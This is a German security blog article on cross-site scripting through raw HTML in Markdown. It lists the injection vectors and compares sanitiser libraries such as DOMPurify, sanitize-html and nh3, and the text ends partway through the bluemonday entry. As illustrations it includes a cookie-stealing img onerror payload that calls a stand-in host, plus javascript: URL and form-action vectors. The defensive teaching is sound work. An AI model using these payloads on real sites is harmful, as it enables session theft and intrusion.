---
title: "Markdown-XSS: Markdown erlaubt rohes HTML, und damit erlaubt es Skripte"
description: "Markdown lässt rohes HTML durch, eine .md-Datei kann also Skripte tragen: die wichtigen Vektoren, Positivlisten gegen Sperrlisten, und was eine CSP hinzufügt"
date: 2026-08-21
tag: Sicherheit
keywords: markdown xss, markdown bereinigen, html bereinigen, dompurify, rohes html in markdown, markdown sicher rendern, benutzereingaben markdown darstellen, xss in html verhindern, content security policy einrichten
---

Markdown wurde entworfen, um neben HTML zu stehen, nicht um es zu ersetzen. Die ursprünglichen Syntaxregeln lassen HTML unangetastet durch, und die Parser, die ihnen folgen, tun das noch heute. Geben Sie `marked` oder Python-Markdown ein `<script>`-Tag, und Sie bekommen ein `<script>`-Tag zurück; `markdown-it` und remark tun dasselbe, sobald rohes HTML eingeschaltet ist.

### Kurzfassung

Markdown erlaubt rohes HTML absichtlich, jedes Markdown, das Sie nicht selbst geschrieben haben, kann also `<script>`, `onerror=`, `javascript:`-URLs, `<iframe srcdoc>`, Formular-Actions und IDs tragen, die Ihre eigenen Globals überdecken. Die Lösung ist ein **Bereiniger mit Positivliste, angewandt auf das dargestellte HTML**, niemals auf die Markdown-Quelle, denn der Renderer erfindet Markup, das wörtlich nie in der Datei stand. Verwenden Sie DOMPurify in einem Browser und auf dem Server einen Bereiniger für Node, Python, Go, Java, Rust oder Ruby gegen *dieselbe* Positivliste, und legen Sie dann eine Content Security Policy auf die Seite, damit ein Fehler im Bereiniger zu einer blockierten Anfrage wird und nicht zu einer gestohlenen Sitzung.

Niemand nimmt sich vor, nicht vertrauenswürdiges Markdown darzustellen. Es kommt von der Seite herein. Ein Kommentarfeld bekommt eine Vorschau, ein Support-Desk beginnt, formatierte Tickets anzunehmen, ein Build-Skript stellt jede README in einem Monorepo auf einem internen Dashboard dar, die Ausgabe eines Modells geht direkt auf eine Seite, damit sie jemand ordentlich lesen kann. In jedem dieser Fälle landet eine Zeichenkette, die jemand anders kontrolliert, in einem Dokument, mit dem sich Ihr eigenes JavaScript ein Fenster teilt.

Für eine Datei aus Ihrem eigenen Repository ist das korrektes Verhalten. Für einen Kommentar, ein Ticket oder die Ausgabe eines Sprachmodells ist es ein Loch: etwas muss zwischen den Parser und die Seite treten.

Das Wort „bereinigen" verbirgt, wie viel Entscheidung darin steckt. Ein Bereiniger ist kein Filter, den man einschaltet. Er ist eine schriftlich festgehaltene Erklärung darüber, welche Tags und Attribute Ihr Produkt erlaubt, angewandt an genau einer Stelle der Pipeline, in einer Umgebung, deren HTML-Parser dem entspricht, den der Leser verwenden wird. Ist die Erklärung falsch, ist sie Dekoration; ist die Stelle falsch, ist sie schlimmer als Dekoration, denn dann sieht alles nach ihr sicher aus.

## Rohes HTML in Markdown ist ein Merkmal, kein Versehen

Markdowns Prämisse war, dass seine Syntax nie alles abdecken würde, alles Nichtabgedeckte würde man also in HTML schreiben. Diese Prämisse ist der Grund, warum sich das Format verbreitet hat und warum es noch heute der kürzeste Weg von Text zu einer Seite ist. Sie ist auch der Grund, warum jeder konforme Renderer vertragsgemäß ein HTML-Durchlass ist.

Ein Payload muss nicht wie eines aussehen. Das hier ist gültiges Markdown:

```markdown
Danke für den Fix, jetzt funktioniert es.

<img src=x onerror="fetch('https://elsewhere.invalid/?c='+document.cookie)">
```

Der Parser erkennt einen Block HTML und kopiert ihn in die Ausgabe. Nichts ist fehlerhaft, also warnt nichts. Es gibt keinen Fehler, keine Log-Zeile und kein sichtbares Artefakt in der dargestellten Seite — ein defektes Bild ist das eine Ding, das zu ignorieren jeder Leser gelernt hat.

Parser haben früher versucht zu helfen. `marked` hatte eine `sanitize`-Option; sie wurde als veraltet markiert und dann entfernt, wobei die Dokumentation stattdessen auf einen eigenen Bereiniger verweist. Das war die richtige Entscheidung. Ein halb geschriebener HTML-Filter in einem Markdown-Parser ist schlimmer als keiner, denn er liest sich wie Schutz: ein Prüfer sieht `sanitize: true` in einem Optionsobjekt und stellt keine Fragen mehr. HTML korrekt zu bereinigen heißt, einen Parser, einen Serialisierer, eine Positivliste und einen Prozess für Sicherheitsreaktionen zu betreiben, und eine Markdown-Bibliothek hat nichts damit zu schaffen, drei dieser vier zu versprechen.

Die einfachste Lösung, wenn sie passt: `markdown-it` lässt rohes HTML standardmäßig aus, spitze Klammern kommen also maskiert und sichtbar heraus. Wenn Ihre Nutzer keinen Grund haben, HTML zu schreiben, lassen Sie es aus — weniger Code und weniger Fehler als jede Positivliste. [Python-Markdown](/blog/markdown-to-html-in-python) hat keinen entsprechenden Schalter, und seine Dokumentation verweist Sie auf einen separaten Bereiniger, eine Python-Pipeline hat also immer einen zweiten Schritt, ob ihn jemand geschrieben hat oder nicht.

Rohes HTML auszuschalten ist die einzige Option auf dieser Seite, die die Angriffsfläche entfernt statt sie zu filtern. Alles andere ist eine Beurteilung darüber, welches HTML Sie auszuführen bereit sind.

## Die Vektoren, benannt

Die Liste unten ist keine Liste exotischer Tricks. Sie ist die gewöhnliche Oberfläche von HTML — einer Sprache zum Bauen von Anwendungen —, der man ein von einem Fremden geschriebenes Dokument in die Hand gibt.

| Was ankommt | Was es tut | Die Regel |
| --- | --- | --- |
| `<script>alert(1)</script>` | Läuft, wenn das HTML geparst und nicht über eine sichere Senke zugewiesen wird | `script` niemals erlauben; `noscript` ebenfalls niemals |
| `<img src=x onerror=...>` | Feuert, wenn das Bild fehlschlägt, was es tun wird | Jedes Attribut verwerfen, dessen Name mit `on` beginnt |
| `<a href="javascript:...">` | Läuft beim Klick, ohne Skript-Tag | Nur `http`, `https`, `mailto` und relative erlauben |
| `<a href="data:text/html,...">` | Ein ganzes Dokument in einer URL | `data:` vollständig aus `href` heraushalten |
| `<iframe srcdoc="...">` | Trägt ein Dokument in einem Attribut, in Ihrem Origin | `iframe`, `object`, `embed` verwerfen |
| `<form action="https://elsewhere">` | Macht aus Ihren Eingabefeldern jemandes Formular | `form`, `button`, `input`, `formaction` verwerfen |
| `<style>` und `style="..."` | Verschiebt, überlagert, versteckt und leckt über `url()` | Beide verwerfen, sofern Sie keinen Grund haben |
| `<a id="config">` | Überdeckt `window.config`, ohne Code auszuführen | Jeder überlebenden `id` und `name` ein Präfix geben |
| `<base href="//elsewhere">` | Richtet jede relative URL auf der Seite um | Verwerfen; `base-uri 'none'` setzen |
| `<meta http-equiv="refresh">` | Navigiert den Leser weg | `meta` verwerfen |
| `<svg>`, `<math>`, `<template>` | Andere Parsing-Regeln, also andere Fehler | Verwerfen, sofern die Positivliste sie nicht braucht |

**Event-Handler-Attribute sind die Hauptsache.** `<script>` ist der Vektor, den jeder zuerst blockiert, und der, der am wenigsten zählt, denn die interessanten Payloads brauchen ihn nicht. Jedes `on*`-Attribut ist ein Inline-Skript in anderer Schreibweise, und die Spezifikation erweitert die Liste weiter. Das ist das klarste einzelne Argument dafür, Attribute auf eine Positivliste zu setzen, statt die zu benennen, die Ihnen nicht gefallen: Sie können `on*` nicht korrekt aufzählen, und Sie müssen es nicht.

**Schemata müssen dekodiert werden, bevor sie geprüft werden können.** Prüfen Sie den dekodierten Wert, nicht die rohe Zeichenkette. `java&#9;script:`, `JaVaScRiPt:` und eine URL mit einem führenden Zeilenumbruch sind für einen Browser eine URL und für einen naiven Vergleich mehrere verschiedene Zeichenketten. Halten Sie `data:` grundsätzlich aus `href` heraus: Browser blockieren zwar eine `data:text/html`-Navigation auf oberster Ebene, aber das ist ihre Gegenmaßnahme, nicht Ihre, und sie deckt nicht jede Senke ab.

**`srcdoc` ist das Attribut, das Leute vergessen.** Ein `<iframe srcdoc>` trägt ein vollständiges HTML-Dokument doppelt maskiert im Wert eines Attributs und erbt das Origin des einbettenden Dokuments. Ein Bereiniger, der `iframe` für Video-Einbettungen erlaubt und `srcdoc` vergisst, hat beliebiges HTML aus dem eigenen Origin durch ein Loch in Form eines Video-Players gelassen.

**Formular-Actions brauchen kein Skript, um zu stehlen.** Ein eingeschleustes `<form action="https://elsewhere.invalid">`, das um einen Teil Ihrer Seite gewickelt ist, macht den nächsten Klick des Lesers zu einer Übermittlung an einen anderen Ort, und ein `<input type="image" formaction="...">` überschreibt die Action eines Formulars, das Sie geschrieben haben. Nichts wird ausgeführt; der Browser tut genau, was das Markup sagt. Deshalb verdienen `form` und `input` Aufmerksamkeit, auch wenn Sie `<input type="checkbox" disabled>` für GFM-Aufgabenlisten erlauben — erlauben Sie die eine Attributkombination, die Sie brauchen, und nichts weiter.

**CSS ist eine Fähigkeit, keine Verzierung.** Die `expression()`-Syntax, die `style` einst direkt ausführbar machte, ist längst aus aktuellen Browsern verschwunden, und sie ist immer noch der Grund für den Ruf, den CSS hier hat. Die lebenden Probleme sind leiser. `position: fixed` mit einem hohen `z-index` legt das Element eines Angreifers über Ihre Oberfläche, ein Klick auf „Abbrechen" landet also auf etwas anderem. `opacity: 0` versteckt Text, der weiterhin markierbar ist. Ein `url()` in einem Hintergrund erreicht einen Dritten in dem Moment, in dem das Element dargestellt wird, was ein Signalgeber ist, der jemandem mitteilt, wann Ihr Dokument gelesen wurde. Nichts davon führt ein Skript aus und alles davon ist ein Problem, weshalb die Standardantwort für `<style>` und `style` nein lautet.

## DOM-Clobbering: eine ID, die eine Eigenschaft überdeckt

Jedes Element mit einer `id` wird unter diesem Namen zu einer Eigenschaft von `window`, und benannte Formularsteuerelemente werden zu Eigenschaften ihres Formulars. Ein eingeschleustes `<a id="config">` macht `window.config` zu einem Anker-Element, `if (!window.config) { window.config = defaults }` nimmt also den falschen Zweig, und `config.apiBase` ist jetzt `undefined` statt Ihrer URL — oder, mit `<a id="config" name="apiBase" href="//elsewhere">`, etwas, das ein Angreifer gewählt hat. Kein Skript ist gelaufen. Ein Attribut hat genügt.

Bereiniger decken davon weniger ab, als ihr Ruf vermuten lässt. DOMPurifys standardmäßige Prüfung auf DOM-Clobbering verwirft eine `id` oder `name` nur dann, wenn der Wert bereits eine Eigenschaft eines `Document` oder eines `HTMLFormElement` ist: `id="title"`, `id="body"`, `id="cookie"` und `id="action"` gehen, `id="config"` bleibt. `config` ist ein Name, den Ihr eigener Code erfunden hat, und kein Bereiniger sieht sich Ihre Globals an. Vollständigere Abdeckung bietet `SANITIZE_NAMED_PROPS`, standardmäßig aus, das jeder `id` und jedem `name`, die es behält, das Präfix `user-content-` voranstellt.

Dieses Präfix ist die eigentliche Verteidigung — eine ID, die nicht kollidieren kann, kann nichts überdecken — und es muss sowohl die IDs abdecken, die im Dokument ankommen, als auch die, die Ihr Renderer aus Überschriften erzeugt, denn eine Überschrift namens „Config" erzeugt `id="config"` ohne jeden beteiligten Angreifer. Diese Website bereinigt mit DOMPurify im Browser und mit dem `xss`-Paket auf dem Server gegen eine gemeinsame Positivliste und stellt jeder Überschriften-ID das Präfix `doc-` voran: dieselbe Verteidigung, von Hand angewandt. Wenn Sie Anker für ein Inhaltsverzeichnis erzeugen, ist das der Schritt, den Sie heute hinzufügen sollten, vor allem anderen auf dieser Seite.

## Positivlisten schlagen Sperrlisten

Eine Sperrliste benennt, was verboten ist, und scheitert beim ersten Mal, wenn jemand ein Tag verwendet, an das niemand gedacht hat. Sie scheitert erneut jedes Mal, wenn ein Browser eine Funktion ausliefert, und ein drittes Mal an Großschreibung, Kodierung oder einem Attribut, von dem der Autor der Liste nie gehört hatte. Eine Positivliste benennt, was ein Dokument enthalten darf, und verwirft den Rest, ihr Fehlerfall ist also ein fehlendes `<details>`-Element und keine gestohlene Sitzung.

Die Positivliste bleibt kurz, denn Markdowns Ausgabe ist klein: Überschriften, Absätze, Listen, Blockzitate, Tabellen, Code, Betonung, Links, Bilder, Trennlinien und ein `<input>` für Aufgabenlisten. Die Attributliste ist noch kürzer — `href`, `src`, `alt`, `title`, `class`, wenn Sie Codeblöcke stylen, `colspan` und `rowspan`, wenn Ihre Tabellen sie brauchen, `type`, `checked` und `disabled` für Aufgabenlisten.

Schreiben Sie diese Liste in einer Datei auf und importieren Sie sie überall. Der häufigste Fehler in der Praxis ist kein Bypass, sondern Auseinanderdriften: der Browser-Bereiniger und der Server-Bereiniger wurden getrennt konfiguriert, sechs Monate auseinander, von zwei Personen, und das Dokument, das in der Anwendung sicher dargestellt wird, liegt mit intaktem `<iframe>` gespeichert, damit der nächste Verbraucher es findet. Zwei Positivlisten sind eine Positivliste und eine Haftung.

Die andere Regel lautet, dass die Positivliste dem Produkt gehört, nicht der Bibliothek. Das `defaultSchema` von rehype-sanitize folgt GitHubs Bereinigungsregeln, und bluemondays `UGCPolicy()` ist eine durchdachte Voreinstellung für Nutzerinhalte — beide bessere Startpunkte als alles, was Sie an einem Nachmittag schreiben. Keines von beiden weiß, ob Ihre Seite ein `<div id="app">` hat, das Ihr Framework liest. Beginnen Sie mit der mitgelieferten Policy und ziehen Sie dann ab.

## Nach dem Rendern bereinigen, niemals davor

Die Markdown-Quelle zu bereinigen heißt zu erraten, was der Parser damit tun wird, und der Parser wird Sie überraschen. Markdown hat mehrere Schreibweisen für dieselbe Ausgabe — Referenzlinks, Backslash-Maskierungen, Zeichenreferenzen, eingerückte HTML-Blöcke —, ein Filter, der die Quelle nach `javascript:` durchsucht, verpasst also `[click](java&#115;cript:alert(1))` und eine Referenzdefinition dreihundert Zeilen unter dem Link, der sie benutzt. Schlimmer noch, der Renderer erfindet Markup, das wörtlich nie dastand: ein Autolink wird zu einem vollständigen `<a href>`, das die Quelle nie enthielt, ein eingezäunter Block wird zu `<pre><code class="language-...">`, eine Überschrift wird zu einer `id`. Ein Filter auf der Quelle filtert die falsche Zeichenkette.

Bereinigen Sie also, was der Renderer ausgegeben hat, und hören Sie dann auf, es anzufassen:

```js
import DOMPurify from 'dompurify';
import { marked } from 'marked';

const clean = DOMPurify.sanitize(marked.parse(userMarkdown), {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'code', 'pre', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title'],
  SANITIZE_NAMED_PROPS: true,
});
```

„Und dann aufhören, es anzufassen" ist die Hälfte, die Leute überspringen. Ein Syntax-Highlighter, der Tokens in Spans wickelt, eine Vorlage, die die Zeichenkette in einen Rahmen interpoliert, ein regulärer Ausdruck, der Anker umschreibt, um `target="_blank"` hinzuzufügen, ein Schritt, der Überschriften-Anker für ein Inhaltsverzeichnis einfügt: jedes davon läuft nach dem Bereiniger und sitzt außerhalb seiner Garantie. Wenn eine Transformation stattfinden muss, führen Sie sie entweder vor dem Bereiniger aus, damit ihre Ausgabe mitgeprüft wird, oder führen Sie sie nach dem Einfügen am DOM aus, mit `textContent` und `setAttribute` statt durch Bearbeiten einer Zeichenkette.

Noch eine Regel zur Stelle: speichern Sie das *originale* Markdown, nicht das bereinigte HTML. Auf dem Weg herein zu bereinigen und dem Speicher danach zu vertrauen friert Ihre Positivliste auf das Datum des Schreibvorgangs ein, an dem Tag, an dem Sie sie verschärfen, bleibt also jedes alte Dokument, wie es war.

## Mutations-XSS: zwei Parser, die sich uneinig sind

Ein Bereiniger parst HTML in einen Baum, entscheidet, dass der Baum sauber ist, und serialisiert ihn zurück in eine Zeichenkette. Der Browser parst diese Zeichenkette dann erneut. Wenn der zweite Parse-Vorgang einen anderen Baum ergibt als der erste, lief die Prüfung auf einem Dokument, das niemand ausliefert. Das ist Mutations-XSS, und der Fehler gehört keinem der beiden Parser — nur ihrer Uneinigkeit.

Achten muss man auf die Stellen, an denen sich die HTML-Parsing-Regeln mitten im Dokument ändern. Fremdinhalt wie `<svg>` und `<math>` folgt XML-artigen Regeln, in denen sich `<style>` und Kommentare anders verhalten. `<template>` hat sein eigenes Inhaltsdokument. Eine Verschachtelung, die ein implizites schließendes Tag erzwingt, kann ein Element aus dem Teilbaum herausbewegen, in dem es geprüft wurde. Entities in Attributwerten werden in einer anderen Phase dekodiert als Entities im Text.

Die Verteidigungen sind langweilig, und langweilig zu sein ist der Punkt. Halten Sie den Bereiniger aktuell, denn diese Fehlerklasse wird von Forschern gefunden und in Releases behoben, das eigentliche Risiko ist also eine festgepinnte drei Jahre alte Version. Verketten Sie niemals zwei Bereiniger, denn was der letzte ausgibt, ist das, was ausgeliefert wird, und die Garantie des ersten ist nichtig. Halten Sie Fremdinhalt von der Positivliste fern, sofern ihn keine Anforderung dorthin bringt.

Serverseitiges Bereinigen hat hier eine strukturelle Lücke: ohne Browser bringt es seinen eigenen Parser mit, nicht den, den Ihr Leser verwenden wird. Ammonias Antwort ist html5ever, das Fragmente so parst und serialisiert, wie Browser es tun; die von sanitize-html ist htmlparser2, gewählt für Geschwindigkeit und Toleranz. Toleranz und Genauigkeit sind nicht dieselbe Eigenschaft. Ein DOM vorzutäuschen ist schlimmer als beides — bekommt DOMPurify eine Umgebung, die es nicht verwenden kann, gibt es seine Eingabe unverändert zurück, statt einen Fehler zu werfen, ein defektes jsdom-Setup scheitert also offen und stillschweigend.

## Der schnelle Vergleich: der Überblick

| Werkzeug | Am besten für | Schlüsselfunktion | Preis |
| --- | --- | --- | --- |
| Gar kein rohes HTML | Kommentare, Chat, alles, was HTML nie brauchte | `markdown-it` maskiert rohes HTML standardmäßig | Kostenlos, MIT |
| DOMPurify (Browser) | Nicht vertrauenswürdiges Markdown auf einer Seite darstellen | Nutzt den eigenen Parser des Browsers, also keine zweite Meinung | Kostenlos, Apache 2.0 oder MPL 2.0 |
| DOMPurify + jsdom | Eine Positivliste auf einem Node-Server wiederverwenden | Dasselbe Konfigurationsobjekt, synthetisches DOM | Kostenlos, Apache 2.0 oder MPL 2.0; jsdom MIT |
| sanitize-html | Node ohne DOM | htmlparser2, Attribut-Positivlisten pro Element | Kostenlos, MIT |
| js-xss (`xss`) | Node, Browser und eine Kommandozeile | `whiteList`-Option, kein DOM nötig, hat ein CLI | Kostenlos, MIT |
| rehype-sanitize | remark- und unified-Pipelines | Bereinigt den hast-Baum, nicht eine Zeichenkette | Kostenlos, MIT |
| nh3 | Python | Bindungen an Rusts ammonia | Kostenlos, MIT |
| Bleach | Nichts Neues | War die Python-Voreinstellung; jetzt nicht mehr gepflegt | Kostenlos, Apache 2.0 |
| bluemonday | Go | `UGCPolicy()`- und `StrictPolicy()`-Voreinstellungen | Kostenlos, BSD-3-Clause |
| OWASP Java HTML Sanitizer | Java | `HtmlPolicyBuilder`, keine Laufzeitabhängigkeiten | Kostenlos, Apache 2.0 oder BSD-2-Clause |
| Ammonia | Rust | html5ever, parst so, wie ein Browser es tut | Kostenlos, MIT oder Apache 2.0 |
| Loofah | Ruby | Nokogiri-Scrubber; Rails' Bereiniger baut darauf auf | Kostenlos, MIT |
| Content Security Policy | Der Fehler im Bereiniger, den Sie noch nicht gefunden haben | Blockiert die Ausführung unabhängig vom Markup | Kostenlos, ein Webstandard |
| Iframe mit Sandbox | Dokumente, die Sie nicht sicher machen können | `sandbox` entfernt Origin, Skripte und Formulare | Kostenlos, Teil von HTML |
| TransformPipe | Eine `.md`-Datei konvertieren, die Sie nicht geschrieben haben | Bereinigt im Browser und auf dem Server, eine Positivliste | Kostenlos |

## Die Optionen, eine nach der anderen

### Gar kein rohes HTML — die Option, die niemand zuerst erwägt

Bevor Sie einen Bereiniger wählen, fragen Sie, ob die Funktion überhaupt existieren muss. Wenn Ihre Nutzer Kommentare, Chat-Nachrichten oder Ticket-Texte schreiben, will fast keiner von ihnen HTML schreiben, und die, die es wollen, sind der Grund, warum Sie das hier lesen. `markdown-it` wird mit `html: false` ausgeliefert, was spitze Klammern maskiert, sodass sie als sichtbarer Text dargestellt werden.

| Vorteile | Nachteile |
| --- | --- |
| Entfernt die Angriffsfläche, statt sie zu filtern | Alles, was Markdown nicht ausdrücken kann, ist jetzt unmöglich |
| Keine Positivliste zu pflegen, kein Bereiniger aktuell zu halten | Anderswo geschriebene Dokumente können schon HTML enthalten |
| Kein Mutations-XSS, denn nichts wird neu geparst | Nutzer, die einen `<details>`-Block brauchen, werden sich beschweren |

**Preis:** kostenlos, MIT-lizenziert.

**Technische Details und Funktionen**

- `markdown-it` steht standardmäßig auf `html: false`; rohes HTML in der Quelle wird maskiert, nicht geparst
- `marked` und Python-Markdown lassen rohes HTML durch und erwarten einen separaten Bereiniger
- Maskieren ist kein Bereiniger: es erzeugt Text, weshalb es nicht umgangen werden kann

**Wer sollte es verwenden?** Jeder, der kurze nutzergenerierte Texte darstellt. Das ist die richtige Voreinstellung für ein Kommentarfeld, und sie wird weit seltener gewählt, als sie es sollte.

### DOMPurify im Browser — die Standardantwort

DOMPurify bereinigt eine HTML-Zeichenkette mit dem DOM der Umgebung, in der es läuft. In einem Browser ist das derselbe Parser, der das Ergebnis darstellen wird, was die Mutations-XSS-Lücke an ihrer Quelle beseitigt: es gibt keine zweite Meinung, weil es nur einen Parser gibt.

| Vorteile | Nachteile |
| --- | --- |
| Nutzt den eigenen Parser des Browsers, der geprüfte Baum ist also der dargestellte Baum | Braucht ein DOM, reines Node erfordert also jsdom |
| Aktiv gepflegt, mit einer echten Historie von Sicherheitsreaktionen | `SANITIZE_NAMED_PROPS` ist standardmäßig aus, Clobbering ist also nur teilweise abgedeckt |
| Die Konfiguration ist ein Optionsobjekt, das Sie über eine Codebasis hinweg teilen können | Gibt seine Eingabe unverändert zurück, wenn es ein unbrauchbares DOM bekommt, was offen scheitert |
| Hooks lassen Sie Knoten während des Bereinigens prüfen und ablehnen | Die Voreinstellungen der Positivliste sind breit; die meisten Produkte sollten davon abziehen |

**Preis:** kostenlos, doppelt lizenziert unter Apache 2.0 oder MPL 2.0.

**Technische Details und Funktionen**

- `ALLOWED_TAGS` und `ALLOWED_ATTR` für eine Positivliste von Grund auf; `ADD_TAGS` und `ADD_ATTR`, um die Voreinstellungen zu erweitern
- `USE_PROFILES` beschränkt auf die HTML-, SVG- oder MathML-Mengen statt auf alle drei
- `FORBID_TAGS` und `FORBID_ATTR`, um von den Voreinstellungen abzuziehen
- `SANITIZE_NAMED_PROPS` stellt überlebenden `id`- und `name`-Werten ein Präfix voran, was die Lösung für DOM-Clobbering ist
- `ALLOW_DATA_ATTR` und `ALLOW_ARIA_ATTR` steuern die zwei großen Attributfamilien

**Wer sollte es verwenden?** Jeder, der Markdown in einem Browser auf eine Seite darstellt. [Die JavaScript-Anleitung](/blog/markdown-to-html-in-javascript) behandelt, wie man `marked` und DOMPurify in der richtigen Reihenfolge verdrahtet.

### DOMPurify mit jsdom — dieselbe Positivliste auf einem Server

DOMPurify läuft auch in Node gegen ein jsdom-Window. Der Grund, das zu tun, ist nicht, dass es der beste Server-Bereiniger ist — es ist, dass es *derselbe* Bereiniger ist, konfiguriert vom selben Objekt, sodass Browser und Server nicht auseinanderdriften können.

| Vorteile | Nachteile |
| --- | --- |
| Eine Positivliste, eine Konfiguration, zwei Laufzeiten | jsdom ist eine große Abhängigkeit für eine einzige Aufgabe |
| Das Verhalten entspricht dem Browser-Pfad eng | jsdom ist kein Browser, die Parser-Lücke kommt also zurück |
| Vertraute API, wenn Ihr Frontend sie schon nutzt | Ein falsch konfiguriertes Window macht es zu einem No-op ohne Fehlermeldung |

**Preis:** kostenlos; DOMPurify Apache 2.0 oder MPL 2.0, jsdom MIT.

**Technische Details und Funktionen**

- Mit `createDOMPurify(new JSDOM('').window)` instanziieren und die Instanz wiederverwenden
- Die Positivliste aus einem gemeinsamen Modul importieren, damit sie nicht nur auf einer Seite bearbeitet werden kann
- In Tests zusichern, dass in der ausgelieferten Konfiguration ein `<script>`-Tag entfernt wird

**Wer sollte es verwenden?** Node-Dienste, die Markdown bereits clientseitig darstellen und eine Definition von „sicher" wollen statt zwei.

### sanitize-html — ein Node-Bereiniger mit eigenem Parser

sanitize-html reinigt HTML mit Attribut-Positivlisten pro Element, gebaut auf htmlparser2 statt auf einem DOM. Die Form seiner Optionen passt ordentlich auf die Art, wie eine Markdown-Positivliste sich tatsächlich liest: dieses Tag darf diese Attribute haben und keine anderen.

| Vorteile | Nachteile |
| --- | --- |
| Kein DOM und kein jsdom, es ist also leicht in einem Serverprozess | Sein Parser ist nicht der des Browsers, was die mXSS-Lücke ist |
| Attribut-Positivlisten gelten pro Element, was die richtige Granularität ist | Die Konfiguration ist ausführlich für eine breite Positivliste |
| `transformTags` schreibt Elemente während des Durchgangs um | Das separate Repository ist archiviert und schreibgeschützt, die Entwicklung ist in das ApostropheCMS-Monorepo gezogen (geprüft auf github.com/apostrophecms/sanitize-html, 8. September 2026) |

**Preis:** kostenlos, MIT-lizenziert.

**Technische Details und Funktionen**

- `allowedTags`, `allowedAttributes`, `allowedSchemes` und `transformTags` als Hauptoptionen
- Gebaut auf htmlparser2, das das Projekt als für Geschwindigkeit und Toleranz gewählt beschreibt
- Läuft überall, wo Node läuft, ohne nativen Build-Schritt

**Wer sollte es verwenden?** Node-Dienste, die eine echte Positivliste wollen, ohne eine DOM-Implementierung auszuliefern, und Teams, denen die Optionsform pro Element leichter zu prüfen erscheint als eine flache Liste.

### js-xss — ein Bereiniger ohne DOM und mit einer Kommandozeile

Das `xss`-Paket bereinigt HTML in Node und in Browsern gegen eine `whiteList`-Option, ohne ein DOM zu brauchen. Es liefert außerdem ein CLI mit, was es sowohl in einer Shell-Pipeline als auch in einem Dienst brauchbar macht.

| Vorteile | Nachteile |
| --- | --- |
| Läuft in Node und Browsern ohne DOM-Abhängigkeit | Eigener Parser, die Parser-Lücke gilt also |
| Ein CLI, es passt also in ein Build-Skript, ohne Code zu schreiben | Kleinere Konfigurationsfläche als die von DOMPurify |
| `whiteList` passt direkt auf Tag-und-Attribut-Paare | `allowList` ist ein Alias, die Dokumentation liest sich also auf zwei Weisen |

**Preis:** kostenlos, MIT-lizenziert.

**Technische Details und Funktionen**

- `whiteList` (als `allowList` aliasiert) definiert erlaubte Tags und deren Attribute
- Eigene Handler für Attributwerte, nützlich für Schema-Prüfungen an `href`
- `xss -i <input> -o <output>` bereinigt eine Datei von der Kommandozeile

**Wer sollte es verwenden?** Node-Dienste, die eine kleine Abhängigkeit wollen, und jeder, der eine Datei in CI ohne Browser bereinigt. Das ist die Server-Hälfte der Pipeline hinter dieser Website, gepaart mit DOMPurify im Browser gegen eine gemeinsame Positivliste.

### rehype-sanitize — den Baum bereinigen, nicht die Zeichenkette

Wenn Ihre Pipeline remark oder unified ist, bereinigt rehype-sanitize den hast-Baum mitten in der Kette. Nichts wird serialisiert, geprüft und neu geparst, was eine ganze Fehlerklasse beseitigt, indem es den Schritt beseitigt, in dem sie wohnt.

| Vorteile | Nachteile |
| --- | --- |
| Arbeitet am Baum, es gibt also keinen Zeichenketten-Rundlauf, über den man uneinig sein könnte | Ergibt nur innerhalb einer unified-Pipeline Sinn |
| `defaultSchema` folgt GitHubs Bereinigungsregeln, ein durchdachter Startpunkt | Die unified-Pipeline bringt echten Lernaufwand mit |
| Kein DOM erforderlich; läuft in Node, Deno und Browsern | Nur ESM, und die Schema-Syntax ist eine eigene Sache zum Lernen |

**Preis:** kostenlos, MIT-lizenziert.

**Technische Details und Funktionen**

- Bereinigt hast, den HTML-Syntaxbaum, zwischen `remark-rehype` und `rehype-stringify`
- `defaultSchema` wird exportiert und kann erweitert oder eingeengt werden
- Platzieren Sie es nach jedem Plugin, das HTML erzeugt, und vor stringify

**Wer sollte es verwenden?** Teams, die remark oder unified schon nutzen, um Dokumente zu transformieren, statt sie nur darzustellen. Ein Bereiniger innerhalb der Pipeline schlägt einen, der an die Ausgabe geschraubt ist.

### nh3 — die Python-Antwort

nh3 stellt Python-Bindungen an ammonia bereit, den HTML-Bereiniger in Rust. Weil die Arbeit in einer kompilierten Bibliothek stattfindet, die einen Parser von Browser-Güte verwendet, ist es sowohl schnell als auch näher am Browser-Verhalten als ein Filter in reinem Python.

| Vorteile | Nachteile |
| --- | --- |
| Gestützt auf ammonia und html5ever, die so parsen, wie Browser es tun | Eine kompilierte Abhängigkeit, Wheels zählen also in eingeschränkten Umgebungen |
| Gepflegt und der praktische Ersatz für Bleach | Eine kleinere API-Fläche als die von Bleach |
| Positivlisten-basiert, passend zum Modell, für das dieser Text argumentiert | Die Konfiguration ist kein Drop-in für die von Bleach |

**Preis:** kostenlos, MIT-lizenziert.

**Wer sollte es verwenden?** Python-Dienste, die Markdown-Ausgabe bereinigen, und alle, die noch Bleach importieren.

### Bleach — das, von dem man weg migrieren sollte

Bleach war jahrelang der Standard-HTML-Bereiniger für Python, und viel bestehendes Werkzeug importiert es noch. Es wird nicht mehr gepflegt: die README stellt fest, dass es keine zukünftigen Releases geben wird, auch nicht für Sicherheitsprobleme (geprüft auf github.com/mozilla/bleach, 8. September 2026).

| Vorteile | Nachteile |
| --- | --- |
| Ein großer Bestand an vorhandenem Code und Dokumentation | Nicht gepflegt, ohne kommende Sicherheits-Releases |
| Vertraute Positivlisten-API | Ein nicht gepflegter Bereiniger ist die eine Abhängigkeit, die man nicht festpinnen und vergessen kann |
| Für die Fälle, die es behandelte, weiterhin funktionsfähig | Die mXSS-Verteidigung hängt an laufender Pflege, und die ist eingestellt |

**Preis:** kostenlos, Apache 2.0-lizenziert.

**Wer sollte es verwenden?** Niemand, für neue Arbeit. Wenn es in Ihrer requirements-Datei steht, ist das ein Migrationsticket und keine Fußnote — das ist eine Fehlerklasse, in der „aktuell halten" der größte Teil der Verteidigung ist.

### bluemonday — die Go-Antwort

bluemonday bereinigt HTML in Go gegen eine Policy, die Sie bauen, oder gegen eine seiner mitgelieferten Voreinstellungen. Seine zwei benannten Policies passen sauber auf die zwei Situationen, die die meisten Produkte haben.

| Vorteile | Nachteile |
| --- | --- |
| `UGCPolicy()` ist ein sinnvoller Startpunkt für Nutzerinhalte | Nur Go |
| `StrictPolicy()` entfernt alles Markup, für Titel und einzeilige Felder | Policy-Bau ist Code, er braucht also Prüfung wie Code |
| Positivlisten-basiert von Entwurf her, mit Regexp-Mustern für Attributwerte | Eigener Parser, die Parser-Lücke gilt also |

